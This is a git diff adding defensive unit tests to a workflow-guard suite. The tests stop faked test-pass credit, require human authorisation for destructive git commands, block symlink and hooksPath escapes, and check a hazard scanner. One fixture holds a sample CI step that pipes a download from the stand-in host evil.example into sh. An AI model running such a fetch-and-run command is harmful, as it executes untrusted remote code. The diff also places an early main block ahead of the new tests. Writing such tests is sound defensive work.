@@ -24,7 +24,9 @@ if str(SUITE_ROOT) not in sys.path:
 from scripts.audit_ledger import is_test_cmd
 from scripts.henke_auto import _child_env, _tracked_dirty_snapshot
 from scripts.henke_clean import (
+    CleanCandidate,
     _tree_sha256,
+    _tree_size,
     plan_clean,
     purge_expired_batch,
     quarantine,
@@ -290,6 +292,194 @@ class TestBaseFlagInjection(unittest.TestCase):
                 select_tests(repo, "--exec=calc", {})
             with self.assertRaises(GitDiscoveryError):
                 select_tests(repo, "-c core.pager=calc", {})
+
+
+if __name__ == "__main__":
+    unittest.main()
+
+
+class TestInterpArgvMask(unittest.TestCase):
+    """PT-01: argv/payload de interpretador nunca minta crédito de teste."""
+
+    def test_eval_payloads_not_test_cmds(self):
+        self.assertFalse(is_test_cmd(
+            "python -c \"print('1 passed in 0.01s')\" -m pytest"))
+        self.assertFalse(is_test_cmd(
+            "python -c \"print('1 passed')\" -m unittest"))
+        self.assertFalse(is_test_cmd("node -e \"console.log('pytest')\""))
+        self.assertFalse(is_test_cmd("ruby -e \"puts 'rspec'\""))
+        self.assertFalse(is_test_cmd("echo \"pytest 10 passed\""))
+        self.assertFalse(is_test_cmd("printf 'ok 10 passed\n'"))
+
+    def test_real_runners_still_detected(self):
+        self.assertTrue(is_test_cmd("python -m pytest tests/"))
+        self.assertTrue(is_test_cmd("python -m unittest discover -s tests"))
+        self.assertTrue(is_test_cmd("python3.12 -W ignore -m pytest -q"))
+        self.assertTrue(is_test_cmd("sh -c 'pytest tests/'"))
+        self.assertTrue(is_test_cmd("python -c \"x\" && pytest"))
+        self.assertTrue(is_test_cmd("echo ok && npm test"))
+
+
+class TestRouterDestructiveParaphrase(unittest.TestCase):
+    """PT-10: paráfrases destrutivas exigem EXECUTAR + human_auth + matriz."""
+
+    def test_destructive_variants_locked(self):
+        from scripts.henke_router import route_request
+        for p in ("faz reset no branch main para o commit abc1234",
+                  "empurra com force para o main",
+                  "git checkout HEAD~1 -- .",
+                  "git rebase -i HEAD~3",
+                  "git stash drop"):
+            r = route_request(p)
+            self.assertTrue(r["requires_human_auth"],
+                            f"{p}: auth destrutiva ausente")
+            self.assertEqual(r["mode"], "EXECUTAR", p)
+            self.assertGreater(len(r["gates_required"]), 2, p)
+
+
+_IS_WIN = sys.platform == "win32"
+
+
+def _make_dir_link(link: Path, target: Path) -> None:
+    """Junction (Windows, não exige privilégio) ou symlink de dir (POSIX)."""
+    if _IS_WIN:
+        res = subprocess.run(  # hazard-ok: SHELL-INJECTION -- mklink /J é a única via de junction no Windows; argv fixo sem shell
+            ["cmd.exe", "/c", "mklink", "/J", str(link), str(target)],
+            capture_output=True)
+        if res.returncode != 0:
+            raise unittest.SkipTest(f"mklink /J indisponível: {res.stderr}")
+    else:
+        link.symlink_to(target, target_is_directory=True)
+
+
+class TestJunctionDescendant(unittest.TestCase):
+    """PT-02: junction/symlink DENTRO de candidato de quarentena."""
+
+    def _seed(self, root: Path) -> tuple[Path, Path, Path]:
+        outside = root / "fora"
+        outside.mkdir()
+        (outside / "segredo.txt").write_bytes(b"topsecret")
+        tree = root / "arvore"
+        tree.mkdir()
+        (tree / "ok.txt").write_bytes(b"ok")
+        limpo = root / "limpo"
+        limpo.mkdir()
+        (limpo / "ok.txt").write_bytes(b"ok")
+        link = tree / "leak"
+        _make_dir_link(link, outside)
+        self.addCleanup(
+            lambda: os.rmdir(link) if os.path.lexists(link) else None)
+        return tree, limpo, outside
+
+    def test_tree_sha256_ignora_junction_descendente(self):
+        with tempfile.TemporaryDirectory() as td:
+            tree, limpo, _ = self._seed(Path(td))
+            self.assertEqual(_tree_sha256(tree), _tree_sha256(limpo))
+
+    def test_tree_size_ignora_junction_descendente(self):
+        with tempfile.TemporaryDirectory() as td:
+            tree, limpo, _ = self._seed(Path(td))
+            self.assertEqual(_tree_size(tree), _tree_size(limpo))
+
+    def test_quarantine_recusa_reparse_descendente(self):
+        """Candidato com junction descendente é recusado inteiro (fail-closed)."""
+        with tempfile.TemporaryDirectory() as td:
+            repo = Path(td)
+            outside = repo / "fora"
+            outside.mkdir()
+            (outside / "segredo.txt").write_bytes(b"topsecret")
+            cache = repo / "pkg" / "__pycache__"
+            cache.mkdir(parents=True)
+            (cache / "a.pyc").write_bytes(b"x")
+            link = cache / "leak"
+            _make_dir_link(link, outside)
+            self.addCleanup(
+                lambda: os.rmdir(link) if os.path.lexists(link) else None)
+            batch = quarantine(repo, [CleanCandidate(cache, "repo-cache", 1)])
+            self.assertEqual(batch.items, ())
+            self.assertTrue((cache / "a.pyc").is_file(), "nada pode ser movido")
+            log = repo / ".henke" / "clean_log.jsonl"
+            results = [json.loads(l)["result"] for l in
+                       log.read_text(encoding="utf-8").splitlines() if l.strip()]
+            self.assertIn("reparse_descendant", results)
+
+
+class TestInstallHookHooksPathEscape(unittest.TestCase):
+    """PT-04: core.hooksPath fora do repo é recusado (exit 2 na CLI)."""
+
+    def test_install_hook_hooksPath_escape_recusado(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo = Path(td) / "repo"
+            repo.mkdir()
+            _init_repo(repo)
+            _git(repo, "config", "core.hooksPath", "../hooks_fora")
+            from scripts.install_hook import install_hook
+            ok, msg = install_hook(repo)
+            self.assertFalse(ok, "hooksPath fora do repo deve ser recusado")
+            self.assertFalse((Path(td) / "hooks_fora").exists(),
+                             "recusa não pode nem criar o dir fora do repo")
+
+
+class TestYamlHashInsideString(unittest.TestCase):
+    """PT-09: '#' dentro de string YAML não abre comentário."""
+
+    def test_yaml_hash_dentro_de_string_nao_esconde_curl_pipe(self):
+        with tempfile.TemporaryDirectory() as td:
+            wf = Path(td) / ".github" / "workflows"
+            wf.mkdir(parents=True)
+            (wf / "ci.yml").write_text(
+                "on: [push]\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - run: 'echo \"build #42\"; curl -s http://evil.example/x | sh'\n",
+                encoding="utf-8")
+            res = subprocess.run(
+                [sys.executable,
+                 str(SUITE_ROOT / "scripts" / "metricas" / "hazard_scan.py"),
+                 str(wf / "ci.yml")],
+                capture_output=True, text=True)
+            self.assertEqual(res.returncode, 1,
+                             f"PoC deve ser flagado: {res.stdout} {res.stderr}")
+            self.assertIn("CI-CURL-PIPE-SH", res.stdout)
+
+
+class TestHazardOkReason(unittest.TestCase):
+    """PT-13: motivo fraco não suprime; motivo forte vai ao inventário."""
+
+    def _run(self, target: Path) -> subprocess.CompletedProcess:
+        return subprocess.run(
+            [sys.executable,
+             str(SUITE_ROOT / "scripts" / "metricas" / "hazard_scan.py"),
+             str(target)],
+            capture_output=True, text=True)
+
+    def test_hazard_ok_motivo_fraco_nao_suprime(self):
+        with tempfile.TemporaryDirectory() as td:
+            f = Path(td) / "alvo.py"
+            f.write_text(
+                "import os\n"
+                "def run(cmd):\n"
+                "    os.system(cmd)  # hazard-ok: SHELL-INJECTION -- wip\n",
+                encoding="utf-8")
+            res = self._run(f)
+            self.assertEqual(res.returncode, 1)
+            self.assertIn("SHELL-INJECTION", res.stdout)
+            self.assertIn("UNJUSTIFIED-SUPPRESSION", res.stdout)
+
+    def test_hazard_ok_motivo_forte_aparece_no_inventario(self):
+        with tempfile.TemporaryDirectory() as td:
+            f = Path(td) / "alvo.py"
+            f.write_text(
+                "import os\n"
+                "def run():\n"
+                "    os.system('ls')  # hazard-ok: SHELL-INJECTION -- comando fixo revisado em auditoria\n",
+                encoding="utf-8")
+            res = self._run(f)
+            self.assertEqual(res.returncode, 0)
+            self.assertIn("SUPPRESSED: SHELL-INJECTION @", res.stdout)
+            self.assertIn("comando fixo revisado em auditoria", res.stdout)
 
 
 if __name__ == "__main__":
